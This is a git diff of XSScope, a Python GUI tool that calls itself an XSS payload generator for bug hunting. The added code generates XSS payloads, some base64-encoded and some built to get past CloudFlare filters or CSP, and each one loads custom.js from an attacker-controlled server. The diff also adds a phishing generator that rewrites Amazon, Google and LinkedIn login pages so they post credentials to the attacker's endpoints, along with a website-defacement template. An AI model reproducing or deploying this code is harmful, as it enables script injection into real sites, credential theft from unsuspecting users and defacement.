@@ -32,23 +32,34 @@ tcp_server_ip = str(tcp_server[:-6])
 tcp_server_port = str(tcp_server[15:])
 
 # license
-document_license = """Copyright (c) 2020 The Browser Pirates
+about_software = '''XSScope is a XSS payload generator platform with an aim of increaing the impact of an XSS during Bug Hunting. Using all modules that XSScope offers, advanced XSS can be simply use with 1 click.
+Note: The creator of this software is not responsible for any ilegal activity or any damage that this software might cause. Use it on your own risk!'''
+
+license_description = '''Copyright (c) 2020 The Browser Pirates
     Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
     The above copyright notice and this permission notice shall be included in all
     copies or substantial portions of the Software.
-    The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. In no event shall the authors or cypyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in conection with the software or the use or other dealings in the software."""
+    The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. In no event shall the authors or cypyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in conection with the software or the use or other dealings in the software.'''
 
 #functions start here
 def quit():
+    if "xsscope.js" in os.popen('ls').read():
+        print("Deleting the temporary xsscope.js file.")
+        os.remove("xsscope.js")
+    elif "custom.js" in os.popen('ls').read():
+        print("Deleting the temporary custom.js file.")
+        os.remove("custom.js")
     tk.Tk().quit()
 
 def documentation():
     global document_license
-    tkinter.messagebox.showinfo("XSScope - Documentation & License", document_license)
+    tkinter.messagebox.showinfo("XSScope - Documentation & License", license_description)
 
 def help():
-    url = "https://github.com/kleiton0x00/XSScope"
-    webbrowser.open(url,new=1)
+    webbrowser.open("https://github.com/kleiton0x00/XSScope/wiki",new=1)
+
+def about():
+    tkinter.messagebox.showinfo("XSScope - About Software", about_software)
 
 #customise + design of GUI
 def agent_module():
@@ -449,9 +460,11 @@ myFunction()
     loading_bar = ttk.Progressbar(root5_frame, orient = HORIZONTAL, length= 555, mode = 'determinate')
     loading_bar.grid(row=0, column=0)
 
-
     build_payload_button = tk.Button(root5_frame, text="Build the payload", command=xss_build)
     build_payload_button.grid(row=0, column=1)
+
+    def quit5():
+        tk.Toplevel().quit()
 
 def check_update():
     version_file = open('version.txt', mode='r')
@@ -467,9 +480,14 @@ def check_update():
         update = tkinter.messagebox.askquestion("Check for update", "There is a newer version, do you want to update?")
         if update == 'yes':
             if platform == "linux" or platform == "linux2":
-                tkinter.messagebox.showinfo("Update", "The software will begin to update, please be patient.")
+                tkinter.messagebox.showinfo("Update information", "The software will begin to update, please be patient.")
+                change_directory = "mv " + str(os.getcwd()) + " " + str(os.getcwd()) + "v1.3"
                 os.system('cd ..')
                 os.system("git clone https://github.com/kleiton0x00/XSScope.git")
+                os.system(change_directory)
+                os.system('chmod +x XSScope-v1.3')
+                os.system('rm -rf XSScope')
+
                 tkinter.messagebox.showinfo("Successful update", "Software successfuly updated, please restart the application.")
             if platform == "win32":
                 os.system('cd ..')
@@ -484,7 +502,7 @@ def check_update():
 
 def show_payload():
     root3 = tk.Toplevel()
-    root3.title("XSScope v.1.2 - All XSS Payloads")
+    root3.title("XSScope v.1.3 - All XSS Payloads")
     root3.geometry('750x580')
     #root3.iconbitmap('x_logo_VYw_icon.ico')
     root3.resizable(0, 0)
@@ -552,7 +570,7 @@ def show_payload():
     payload10_final = "<svg/onload=eval(atob('" + payload10 + "))>"
 
     #save to intruder file
-    intruder_content = payload1 + "\n" + payload2 + "\n" + payload3 + "\n" + payload4 + "\n" + payload5 + "\n" + payload6 + "\n" + payload7 + "\n" + payload8 + "\n" + payload9 + "\n" + payload10_final
+    intruder_content = payload1 + "\n" + payload2 + "\n" + payload3_final + "\n" + payload4 + "\n" + payload5 + "\n" + payload6 + "\n" + payload7 + "\n" + payload8 + "\n" + payload9 + "\n" + payload10_final
     def directory_save():
         intruder = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".txt")
         if intruder is None:  # asksaveasfile return `None` if dialog closed with "cancel".
@@ -678,14 +696,424 @@ def show_payload():
     root3.config(menu=menubar1)
     root3.mainloop()
 
+def phishing_website():
+    root4 = tk.Toplevel()
+    root4.title("XSScope v.1.3 - Phishing Website Generator")
+    root4.geometry('1000x1000')
+    root4.resizable(0, 0)
+    # root4.iconbitmap('x_logo_VYw_icon.ico')
+
+    def quit4():
+        tk.Toplevel().quit()
+
+    def show_payloads_html():
+        root3_html = tk.Toplevel()
+        root3_html.title("XSScope v.1.3 - All XSS Payloads for generated HTML code")
+        root3_html.geometry('750x580')
+        # root3_html.iconbitmap('x_logo_VYw_icon.ico')
+        root3_html.resizable(0, 0)
+
+        main_frame10_html = LabelFrame(root3_html, text="")
+        main_frame10_html.place(x=5, y=0)
+
+        # work on this function to copy payload in clipboard
+        def copy_payload1_html():
+            pyperclip.copy(payload1_html)
+
+        def copy_payload2_html():
+            pyperclip.copy(payload2_html)
+
+        def copy_payload3_html():
+            pyperclip.copy(payload3_final_html)
+
+        def copy_payload4_html():
+            pyperclip.copy(payload4_html)
+
+        def copy_payload5_html():
+            pyperclip.copy(payload5_html)
+
+        def copy_payload6_html():
+            pyperclip.copy(payload6_html)
+
+        def copy_payload7_html():
+            pyperclip.copy(payload7_html)
+
+        def copy_payload8_html():
+            pyperclip.copy(payload8_html)
+
+        def copy_payload9_html():
+            pyperclip.copy(payload9_html)
+
+        def copy_payload10_html():
+            pyperclip.copy(payload10_final_html)
+
+        # generating all XSS payloads
+
+        payload3_script_html = 'var a=document.createElement("script");a.src="http://' + tcp_server + '/custom.js' + '";document.body.appendChild(a);'
+        payload3_b64 = str(base64.b64encode(payload3_script_html.encode('utf-8')))
+        payload3_html = str(payload3_b64.split("b'")[1])
+        payload3_html = str(payload3_html[:-1])
+        payload3_html = str(payload3_html[:-2])
+
+        cloudflare_bypass = "&Tab;"  # needed for payload 8
+
+        payload1_html = '<script src="http://' + tcp_server + '/custom.js"></script>'
+
+        payload10_script_html = str(base64.b64encode(payload1_html.encode('utf-8')))
+        payload10_html = str(payload10_script_html.split("b'")[1])
+
+        payload2_html = """javascript:eval('var a=document.createElement(\'script\');a.src=\'http://""" + tcp_server + """/custom.js\';document.body.appendChild(a)')"""
+        payload3_final_html = '"><input onfocus=eval(atob(this.id)) id=' + payload3_html + '&#61;&#61; autofocus>'
+        payload4_html = '"><img src=x id=' + payload3_html + '&#61;&#61; onerror=eval(atob(this.id))>'
+        payload5_html = '"><video><source onerror=eval(atob(this.id)) id=' + payload3_html + '&#61;&#61;>'
+        payload6_html = '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + tcp_server + '/custom.js");a.send();</script>'
+        payload7_html = '<script>$.getScript("//' + tcp_server + '/custom.js")</script>'
+        payload8_html = "<iframe src=h" + cloudflare_bypass + "t" + cloudflare_bypass + "t" + cloudflare_bypass + "p" + cloudflare_bypass + ":" + cloudflare_bypass + "/" + cloudflare_bypass + "/" + cloudflare_bypass + \
+                   list(tcp_server)[0] + cloudflare_bypass + list(tcp_server)[1] + cloudflare_bypass + list(tcp_server)[
+                       2] + cloudflare_bypass + list(tcp_server)[3] + cloudflare_bypass + list(tcp_server)[
+                       4] + cloudflare_bypass + list(tcp_server)[5] + cloudflare_bypass + list(tcp_server)[
+                       6] + cloudflare_bypass + list(tcp_server)[7] + cloudflare_bypass + list(tcp_server)[
+                       8] + cloudflare_bypass + list(tcp_server)[9] + cloudflare_bypass + list(tcp_server)[
+                       10] + cloudflare_bypass + list(tcp_server)[11] + cloudflare_bypass + list(tcp_server)[
+                       12] + cloudflare_bypass + list(tcp_server)[13] + cloudflare_bypass + list(tcp_server)[
+                       14] + cloudflare_bypass + list(tcp_server)[15] + cloudflare_bypass + list(tcp_server)[
+                       16] + cloudflare_bypass + list(tcp_server)[17] + cloudflare_bypass + list(tcp_server)[
+                       18] + cloudflare_bypass + list(tcp_server)[
+                       19] + cloudflare_bypass + "/" + cloudflare_bypass + "c" + cloudflare_bypass + "u" + cloudflare_bypass + "s" + cloudflare_bypass + "t" + cloudflare_bypass + "o" + cloudflare_bypass + "m" + cloudflare_bypass + "." + cloudflare_bypass + "j" + cloudflare_bypass + "s" + cloudflare_bypass + "></iframe>"
+        payload9_html = '<!' + str(payload1_html)
+        payload10_final_html = "<svg/onload=eval(atob('" + payload10_html + "))>"
+
+        # save to intruder file
+        intruder_content_html = payload1_html + "\n" + payload2_html + "\n" + payload3_final_html + "\n" + payload4_html + "\n" + payload5_html + "\n" + payload6_html + "\n" + payload7_html + "\n" + payload8_html + "\n" + payload9_html + "\n" + payload10_final_html
+
+        def directory_save_html():
+            intruder_html = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".txt")
+            if intruder_html is None:  # asksaveasfile return `None` if dialog closed with "cancel".
+                return
+            intruder_html.write(intruder_content_html)
+            intruder_html.close()
+
+        # customising the Tab for all payloads
+
+        introduction_text = tk.Label(main_frame10_html,
+                                     text="The following payloads are used for the generated HTML codes.")
+        introduction_text.grid(row=0, column=0)
+
+        main_frame11_html = LabelFrame(root3_html, text="")
+        main_frame11_html.place(x=5, y=40)
+
+        payload1_text = tk.Label(main_frame11_html, text="Basic Tag Payload: ")
+        payload1_text.grid(row=0, column=0)
+
+        payload1_entry = tk.Entry(main_frame11_html, width=76)
+        payload1_entry.insert(END, payload1_html)
+        payload1_entry.grid(row=1, column=0)
+
+        copy_payload1 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload1_html)  # add command
+        copy_payload1.grid(row=1, column=1)
+
+        payload2_text = tk.Label(main_frame11_html, text="URI Payload (Use where URI's are taken as input): ")
+        payload2_text.grid(row=2, column=0)
+
+        payload2_entry = tk.Entry(main_frame11_html, width=76)
+        payload2_entry.insert(END, payload2_html)
+        payload2_entry.grid(row=3, column=0)
+
+        copy_payload2 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload2_html)  # add command
+        copy_payload2.grid(row=3, column=1)
+
+        payload3_text = tk.Label(main_frame11_html, text="Tag Payload (Bypassing Blacklist system): ")
+        payload3_text.grid(row=4, column=0)
+
+        payload3_entry = tk.Entry(main_frame11_html, width=76)
+        payload3_entry.insert(END, payload3_final_html)
+        payload3_entry.grid(row=5, column=0)
+
+        copy_payload3 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload3_html)  # add command
+        copy_payload3.grid(row=5, column=1)
+
+        payload4_text = tk.Label(main_frame11_html, text="Tag Payload (Use when <script> tags are filtered): ")
+        payload4_text.grid(row=6, column=0)
+
+        payload4_entry = tk.Entry(main_frame11_html, width=76)
+        payload4_entry.insert(END, payload4_html)
+        payload4_entry.grid(row=7, column=0)
+
+        copy_payload4 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload4_html)  # add command
+        copy_payload4.grid(row=7, column=1)
+
+        payload5_text = tk.Label(main_frame11_html, text="Tag Payload (HTML5 payload): ")
+        payload5_text.grid(row=8, column=0)
+
+        payload5_entry = tk.Entry(main_frame11_html, width=76)
+        payload5_entry.insert(END, payload5_html)
+        payload5_entry.grid(row=9, column=0)
+
+        copy_payload5 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload5_html)  # add command
+        copy_payload5.grid(row=9, column=1)
+
+        payload6_text = tk.Label(main_frame11_html, text="Payload for exploitation of webapp with CSP: ")
+        payload6_text.grid(row=10, column=0)
+
+        payload6_entry = tk.Entry(main_frame11_html, width=76)
+        payload6_entry.insert(END, payload6_html)
+        payload6_entry.grid(row=11, column=0)
+
+        copy_payload6 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload6_html)  # add command
+        copy_payload6.grid(row=11, column=1)
+
+        payload7_text = tk.Label(main_frame11_html, text="Payload for websites that include JQuery: ")
+        payload7_text.grid(row=12, column=0)
+
+        payload7_entry = tk.Entry(main_frame11_html, width=76)
+        payload7_entry.insert(END, payload7_html)
+        payload7_entry.grid(row=13, column=0)
+
+        copy_payload7 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload7_html)  # add command
+        copy_payload7.grid(row=13, column=1)
+
+        payload8_text = tk.Label(main_frame11_html, text="Tag Payload (CloudFlare Bypassing): ")
+        payload8_text.grid(row=14, column=0)
+
+        payload8_entry = tk.Entry(main_frame11_html, width=76)
+        payload8_entry.insert(END, payload8_html)
+        payload8_entry.grid(row=15, column=0)
+
+        copy_payload8 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload8_html)  # add command
+        copy_payload8.grid(row=15, column=1)
+
+        payload9_text = tk.Label(main_frame11_html, text="Tag Payload (AWS Bypassing): ")
+        payload9_text.grid(row=16, column=0)
+
+        payload9_entry = tk.Entry(main_frame11_html, width=76)
+        payload9_entry.insert(END, payload9_html)
+        payload9_entry.grid(row=17, column=0)
+
+        copy_payload9 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload9_html)  # add command
+        copy_payload9.grid(row=17, column=1)
+
+        payload10_text = tk.Label(main_frame11_html, text="Base64-Encoded Payload: ")
+        payload10_text.grid(row=18, column=0)
+
+        payload10_entry = tk.Entry(main_frame11_html, width=76)
+        payload10_entry.insert(END, payload10_final_html)
+        payload10_entry.grid(row=19, column=0)
+
+        copy_payload10 = tk.Button(main_frame11_html, text="Copy payload", command=copy_payload10_html)  # add command
+        copy_payload10.grid(row=19, column=1)
+
+        menubar1_html = Menu(root3_html)
+        filemenu1_html = Menu(menubar1_html, tearoff=0)
+        filemenu1_html.add_command(label="Save all payloads", command=directory_save_html)
+        # filemenu1_html.add_separator()
+        filemenu1_html.add_command(label="Exit", command=quit4)
+        menubar1_html.add_cascade(label="Main", menu=filemenu1_html)
+
+        root3_html.config(menu=menubar1_html)
+        root3_html.mainloop()
+
+    def add_html_code():
+        html_payload_code = str(html_code.get("1.0",END))
+        if html_payload_code == """
+""":
+            tkinter.messagebox.showerror("Error applying code", "Please add a code to the textbox.")
+        else:
+            pass
+
+        # Convert String list to ascii values
+        # using loop + ord()
+        res = []
+        for char in html_payload_code:
+            res.extend(ord(num) for num in char)
+
+        #converted string to ascii
+        final_asci_code = str(res)
+
+        #adding and removing strings to make it the final version to save to the file
+        final_asci_code1 = final_asci_code[1:-1]
+        final_asci_code2 = "document.documentElement.innerHTML=String.fromCharCode(" + final_asci_code1 + ")"
+
+        #script to save into /custom.js
+        built_html_payload = open("custom.js", "w")
+        built_html_payload.write(final_asci_code2)
+        built_html_payload.close()
+
+    explaination_frame = LabelFrame(root4, text="")
+    explaination_frame.place(x=5, y=0)
+
+    explaination_text = tk.Label(explaination_frame, text="Create your own HTML Website or simply choose one of our pre-generated HTML samples. Only add the HTML code, the software will do the rest.")
+    explaination_text.grid(row=0, column=0)
+
+    #frame for a big space where user can add their own HTML code
+    html_code_frame = tk.LabelFrame(root4, text="HTML code: ")
+    html_code_frame.place(x=5, y=100)
+
+    html_code = Text(html_code_frame, width=120, height=50)
+    html_code.grid(row=0, column=0, sticky="ew")
+
+    #script for scrollbar attached to the textbox
+    scrollbar = tk.Scrollbar(html_code_frame,command=html_code.yview)
+    html_code.config(yscrollcommand=scrollbar.set)
+    scrollbar.grid(row=0,column=1,sticky=NSEW)
+
+    #html pregenerated HTML templates
+    html_developer_frame = tk.LabelFrame(root4, text="Pre-generated HTML codes:")
+    html_developer_frame.place(x=5, y=30)
+
+    #function for importing html code
+    def import_html():
+        imported_html_file = tkinter.filedialog.askopenfilename()
+        if imported_html_file is None:  # asksaveasfile return `None` if dialog closed with "cancel".
+            return
+        else:
+            html_code.delete('1.0', END)
+            with open (str(imported_html_file)) as imported_code:
+                html_code.insert('1.0', imported_code.read())
+            # showing the success message that the code has been imported
+            tkinter.messagebox.showinfo("Success", "The HTML code has been successful imported.")
+
+    #the function below is to get the value of the optionmenu of the user
+    def callback(selection):
+
+        #analyzing the behaviour of the software when website deface is selected
+        if selection == "Website Deface":
+            html_code.delete('1.0', END)
+            with open('templates/website_deface.html', 'r') as f:
+                html_code.insert("1.0", f.read())
+
+        if selection == "None" or selection== "Choose a pre-generated HTML code":
+            html_code.delete('1.0', END)
+
+        #the begin of amazon login form creation, if selected
+        if selection == "Amazon Login Form":
+            html_code.delete('1.0', END)
+            with open('templates/amazon/login.html') as f:
+                lines = f.readlines()
+
+            lines[225] = '''        <form name="signIn" method="post" novalidate="" action="http://''' + tcp_server + '''/login_phishing/amazon_login.php" class="a-spacing-none fwcim-form" data-fwcim-id="undefinede6ba0ec5">\n'''
+            with open('templates/amazon/login.html', "w") as f:
+                f.writelines(lines)
+                f.close()
+
+            with open('templates/amazon/login.html') as f:
+                html_code.insert("1.0", f.read())
+
+        #the begin of google login form creation, if selected
+        if selection == "Google Login Form":
+            html_code.delete('1.0', END)
+            with open('templates/google/login1.html') as f:
+                lines = f.readlines()
+
+            lines[1048] = '''  <form novalidate method="post" action="http://''' + tcp_server + '''/login_phishing/google_login.php" id="gaia_loginform">\n'''
+            with open('templates/google/login1.html', "w") as f:
+                f.writelines(lines)
+                f.close()
+
+            with open('templates/google/login1.html') as f:
+                html_code.insert("1.0", f.read())
+
+        #the begin of LinkedIn login form creation, if selected
+        if selection == "Linkedin Login Form":
+            html_code.delete('1.0', END)
+            with open('templates/linkedin/login.html') as f:
+                lines = f.readlines()
+
+            lines[82] = '''        <div class="global-wrapper artdeco-a"><code id="i18n_sign_in" style="display: none;"><!--"Sign in"--></code><code id="i18n_join_now" style="display: none;"><!--"Join now"--></code><div class="header"><div class="wrapper"><h1><img class="lazy-load" data-delayed-url="https://static.licdn.com/sc/h/95o6rrc5ws6mlw6wqzy0xgj7y" alt="LinkedIn"/></h1><form class="login-form" action="http://''' + tcp_server + '''/login_phishing/linkedin_login.php" method="POST"><label for="login-email">Email</label><input type="text"name="session_key"class="login-email"autocapitalize="off"tabindex="1"id="login-email"placeholder="Email"autofocus="autofocus"><label for="login-password">Password</label><input type="password"name="session_password"class="login-password"id="login-password"aria-required="true"tabindex="1"placeholder="Password"/><input tabindex="1" id="login-submit" class="login submit-button" type="submit" value="Sign in" ><a class="link-forgot-password" tabindex="1" href="https://www.linkedin.com/uas/request-password-reset?trk=uno-reg-guest-home-forgot-password">Forgot password?</a><div id="login-callout" class="hopscotch-bubble animated hopscotch-callout no-number hidden" tabindex="-1"><div class="hopscotch-bubble-container"><div class="hopscotch-bubble-content"><h3 class="hopscotch-title">Trying to sign in?</h3><div class="hopscotch-content">Someone&#39;s already using that email. If that’s you, enter your Email and password here to sign in.</div></div><a title="Close" href="#" class="hopscotch-bubble-close hopscotch-close">Close</a></div><div class="hopscotch-bubble-arrow-container hopscotch-arrow up"></div></div><input name="isJsEnabled" type="hidden" value="false"/><input name="loginCsrfParam" id="loginCsrfParam-login" type="hidden" value="3c0c2b17-a4e5-4a6c-84bc-87e7dd9327a2"/></form></div></div><div id="main-container" class="main background lazy-load show-join   " data-delayed-url="https://static.licdn.com/sc/h/64xk850n3a8uzse6fi11l3vmz"><form id="regForm" class="reg-form" action="https://www.linkedin.com/start/join-prefill" method="POST" data-jsenabled="check"><h2 class="title">Be great at what you do</h2><h3 class="subtitle">Get started - it's free.</h3><div class="reg-alert hidden" role="alert" tabindex="-1"><div class="wrapper"><p class="message"><span class="alert-content"></span></p><button class="dismiss dismiss-alert"><li-icon type="cancel-icon" size="small" a11y-text="Dismiss"></li-icon></button></div></div><section class="form-body"><label for="reg-firstname">First name</label><input type="text"name="firstName"id="reg-firstname"class="reg-firstname"aria-required="true"tabindex="1"placeholder=""/><label for="reg-lastname">Last name</label><input type="text"name="lastName"id="reg-lastname"class="reg-lastname"aria-required="true"tabindex="1"placeholder=""/><label for="reg-email">Email</label><input type="text"name="session_key"class="reg-email"autocapitalize="off"tabindex="1"id="reg-email"autofocus="autofocus"><label for="reg-password">Password (6 or more characters)</label><input type="password"name="session_password"class="reg-password"id="reg-password"aria-required="true"tabindex="1"autocomplete="new-password"/><span class="agreement">By clicking Join now, you agree to the LinkedIn <a tabindex="4" href="https://www.linkedin.com/legal/user-agreement">User Agreement</a>, <a tabindex="4" href="https://www.linkedin.com/legal/privacy-policy">Privacy Policy</a>, and <a tabindex="4" href="https://www.linkedin.com/legal/cookie-policy">Cookie Policy</a>.</span><input tabindex="4" id="registration-submit" class="registration submit-button" type="submit" value="Join now" ></section></form></div><div class="meter"><form class="same-name-search" method="GET" action="https://www.linkedin.com/pub/dir/"><h3 class="title">Find a colleague</h3><input type="text" name="first" placeholder="First name"><input type="text" name="last" placeholder="Last name"><input type="hidden" name="trk" value="uno-reg-guest-home-name-search"><input type="submit" class="submit-btn" name="search" value="Search"></form><div class="directory"><h3 class="title">LinkedIn member directory: </h3><ol><li><a href="https://www.linkedin.com/directory/people-a">A</a></li><li><a href="https://www.linkedin.com/directory/people-b">B</a></li><li><a href="https://www.linkedin.com/directory/people-c">C</a></li><li><a href="https://www.linkedin.com/directory/people-d">D</a></li><li><a href="https://www.linkedin.com/directory/people-e">E</a></li><li><a href="https://www.linkedin.com/directory/people-f">F</a></li><li><a href="https://www.linkedin.com/directory/people-g">G</a></li><li><a href="https://www.linkedin.com/directory/people-h">H</a></li><li><a href="https://www.linkedin.com/directory/people-i">I</a></li><li><a href="https://www.linkedin.com/directory/people-j">J</a></li><li><a href="https://www.linkedin.com/directory/people-k">K</a></li><li><a href="https://www.linkedin.com/directory/people-l">L</a></li><li><a href="https://www.linkedin.com/directory/people-m">M</a></li><li><a href="https://www.linkedin.com/directory/people-n">N</a></li><li><a href="https://www.linkedin.com/directory/people-o">O</a></li><li><a href="https://www.linkedin.com/directory/people-p">P</a></li><li><a href="https://www.linkedin.com/directory/people-q">Q</a></li><li><a href="https://www.linkedin.com/directory/people-r">R</a></li><li><a href="https://www.linkedin.com/directory/people-s">S</a></li><li><a href="https://www.linkedin.com/directory/people-t">T</a></li><li><a href="https://www.linkedin.com/directory/people-u">U</a></li><li><a href="https://www.linkedin.com/directory/people-v">V</a></li><li><a href="https://www.linkedin.com/directory/people-w">W</a></li><li><a href="https://www.linkedin.com/directory/people-x">X</a></li><li><a href="https://www.linkedin.com/directory/people-y">Y</a></li><li><a href="https://www.linkedin.com/directory/people-z">Z</a></li><li><a href="https://www.linkedin.com/directory/people-1">More</a></li><li class="country-search"><a href="https://www.linkedin.com/directory/country_listing/?trk=uno-reg-guest-home-country">Browse by country/region</a></li></ol></div><div class="links-container ghp-footer"><div class="links links-general ghp-footer__section"><h3 class="title ghp-footer__section-title">General</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/start/join?trk=uno-reg-guest-home-join" class="ghp-footer__link">Sign Up</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/help/linkedin?trk=uno-reg-guest-home-help-center&amp;lang=en" class="ghp-footer__link">Help Center</a></li><li class="ghp-footer__link-item"><a href="https://press.linkedin.com/about-linkedin?trk=uno-reg-guest-home-about" class="ghp-footer__link">About</a></li><li class="ghp-footer__link-item"><a href="https://press.linkedin.com?trk=uno-reg-guest-home-press" class="ghp-footer__link">Press</a></li><li class="ghp-footer__link-item"><a href="https://blog.linkedin.com?trk=uno-reg-guest-home-blog" class="ghp-footer__link">Blog</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/company/linkedin/careers?trk=uno-reg-guest-home-careers" class="ghp-footer__link">Careers</a></li><li class="ghp-footer__link-item"><a href="https://developer.linkedin.com?trk=uno-reg-guest-home-developers" class="ghp-footer__link">Developers</a></li></ul></div><div class="links links-business ghp-footer__section"><h3 class="title ghp-footer__section-title">Business Solutions</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://business.linkedin.com/talent-solutions?src=li-footer&amp;utm_source=linkedin&amp;utm_medium=footer&amp;trk=uno-reg-guest-home-enterprise-talent" class="ghp-footer__link">Talent</a></li><li class="ghp-footer__link-item"><a href="https://business.linkedin.com/marketing-solutions?src=li-footer&amp;utm_source=linkedin&amp;utm_medium=footer&amp;trk=uno-reg-guest-home-enterprise-marketing" class="ghp-footer__link">Marketing</a></li><li class="ghp-footer__link-item"><a href="https://business.linkedin.com/sales-solutions?src=li-footer&amp;utm_source=linkedin&amp;utm_medium=footer&amp;trk=uno-reg-guest-home-enterprise-sales" class="ghp-footer__link">Sales</a></li><li class="ghp-footer__link-item"><a href="https://learning.linkedin.com?src=li-footer&amp;trk=uno-reg-guest-home-enterprise-learning" class="ghp-footer__link">Learning</a></li></ul></div><div class="links links-browse ghp-footer__section"><h3 class="title ghp-footer__section-title">Browse LinkedIn</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/learning/?trk=uno-reg-guest-home-learning" class="ghp-footer__link">Learning</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/jobs?trk=uno-reg-guest-home-jobs" class="ghp-footer__link">Jobs</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/salary/?trk=uno-reg-guest-home-salary" class="ghp-footer__link">Salary</a></li><li class="ghp-footer__link-item"><a href="https://mobile.linkedin.com?trk=uno-reg-guest-home-mobile" class="ghp-footer__link">Mobile</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/profinder?trk=uno-reg-guest-home-profinder" class="ghp-footer__link">ProFinder</a></li></ul></div><div class="links links-directories ghp-footer__section"><h3 class="title ghp-footer__section-title">Directories</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/people-a?trk=uno-reg-guest-home-people-directory" class="ghp-footer__link">Members</a></li><li><a href="https://www.linkedin.com/directory/jobs?trk=uno-reg-guest-home-jobs-directory" class="ghp-footer__link">Jobs</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/pulse?trk=uno-reg-guest-home-pulse" class="ghp-footer__link">Pulse</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/companies/?trk=uno-reg-guest-home-companies-directory" class="ghp-footer__link">Companies</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/salaries?trk=uno-reg-guest-home-salaries-directory" class="ghp-footer__link">Salaries</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/universities?trk=uno-reg-guest-home-universities" class="ghp-footer__link">Universities</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/topjobs?trk=uno-reg-guest-home-topJobs-directory" class="ghp-footer__link">Top Jobs</a></li></ul></div></div><div class="legal-nav"><div class="copyright"><img class="logo-copyright lazy-load" data-delayed-url="https://static.licdn.com/sc/h/5koy91fjbrc47yhwyzws65ml7" alt="LinkedIn"> &copy; 2018</div><ul><li><a href="https://www.linkedin.com/legal/user-agreement?trk=uno-reg-guest-home-user-agreement">User Agreement</a></li><li><a href="https://www.linkedin.com/legal/privacy-policy?trk=uno-reg-guest-home-privacy-policy">Privacy Policy</a></li><li><a href="https://www.linkedin.com/help/linkedin/answer/34593?lang=en&amp;trk=uno-reg-guest-home-community-guidelines">Community Guidelines</a></li><li><a href="https://www.linkedin.com/legal/cookie-policy?trk=uno-reg-guest-home-cookie-policy">Cookie Policy</a></li><li><a href="https://www.linkedin.com/legal/copyright-policy?trk=uno-reg-guest-home-copyright-policy">Copyright Policy</a></li><li><a href="https://www.linkedin.com/psettings/guest-controls?trk=uno-reg-guest-home-guest-controls">Guest Controls</a></li><li class="lang-selector-container"><input type="checkbox" id="lang-selector-state" name="lang-selector-state"/><label for="lang-selector-state" class="lang-selector-state-label" tabindex="0" role="button" aria-expanded="false">Language</label><form name="languageSelectorForm" id="languageSelectorForm" action="/languageSelector" method="POST"><ul class="lang-selector"><li><button data-locale="in_ID">Bahasa Indonesia</button></li><li><button data-locale="ms_MY">Bahasa Malaysia</button></li><li><button data-locale="cs_CZ">Čeština</button></li><li><button data-locale="da_DK">Dansk</button></li><li><button data-locale="de_DE">Deutsch</button></li><li><span class="current">English</span></li><li><button data-locale="es_ES">Español</button></li><li><button data-locale="zh_TW">正體中文</button></li><li><button data-locale="fr_FR">Français</button></li><li><button data-locale="ko_KR">한국어</button></li><li><button data-locale="it_IT">Italiano</button></li><li><button data-locale="zh_CN">简体中文</button></li><li><button data-locale="nl_NL">Nederlands</button></li><li><button data-locale="ja_JP">日本語</button></li><li><button data-locale="no_NO">Norsk</button></li><li><button data-locale="pl_PL">Polski</button></li><li><button data-locale="pt_BR">Português</button></li><li><button data-locale="ro_RO">Română</button></li><li><button data-locale="ru_RU">Русский</button></li><li><button data-locale="sv_SE">Svenska</button></li><li><button data-locale="tl_PH">Tagalog</button></li><li><button data-locale="th_TH">ภาษาไทย</button></li><li><button data-locale="tr_TR">Türkçe</button></li><li><button data-locale="ar_AE">العربية</button></li></ul><input type="hidden" name="i18nLang" value=""><input type="hidden" name="currenturl" value=""></form></li></ul></div></div></div><script type="application/ld+json">{"@context": "http://schema.org","@type": "WebSite","url": "https://www.linkedin.com/","potentialAction": {"@type": "SearchAction","target": "https://www.linkedin.com/vsearch/f?type=all&keywords=","query-input": "required name=search_term"}}</script><script type="text/javascript" src="https://static.licdn.com/sc/h/3qk7aqkysw7gz575y2ma1e5ky"></script><code id="__pageContext__" style="display: 